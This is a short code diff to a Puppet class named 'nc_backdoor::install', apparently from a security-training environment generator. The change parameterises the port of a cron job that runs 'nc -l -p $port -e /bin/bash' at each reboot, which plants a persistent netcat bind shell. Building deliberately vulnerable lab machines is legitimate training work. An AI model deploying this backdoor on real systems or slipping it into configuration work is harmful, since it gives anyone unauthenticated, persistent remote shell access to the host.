@@ -3,9 +3,12 @@ class nc_backdoor::install {
   #   ensure => installed
   # }
 
-  # TODO: parameter for port number
+  $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
+  $port = $secgen_parameters['port'].first
+
+  # run on each boot via cron
   cron { 'backdoor':
-    command     => 'nc -l -p 4444 -e /bin/bash',
+    command     => "nc -l -p $port -e /bin/bash",
     special     => 'reboot',
   }
 }
